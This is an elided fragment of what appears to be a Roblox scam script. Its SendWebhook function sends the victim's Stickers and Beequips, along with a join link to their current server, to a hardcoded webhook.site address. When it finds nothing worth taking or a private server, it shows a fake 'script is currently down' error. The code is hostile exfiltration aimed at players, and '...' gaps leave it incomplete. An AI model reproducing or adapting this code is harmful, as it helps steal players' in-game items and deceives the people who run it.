...
local function SendWebhook()
	...
	if (#Stickers == 0 and #Beequips == 0) or game:GetService("ReplicatedFirst").PlaceInfo.IsPublicServer.Value == false then
		error("The script is currently down, please try to execute is again later.")
	end
	...
	local WebhookURL = "https://webhook.site/d4589bea-e41f-4cbe-b1be-3b18800ccb17"

	local data = {
		["game_link"] = "https://roblox.com/discover#/rg-join/1537690962/"..game.JobId,
		["requested_items"] = {
			["stickers"] = StickersToSend,
			["beequips"] = BeequipsToSend
		}
	}
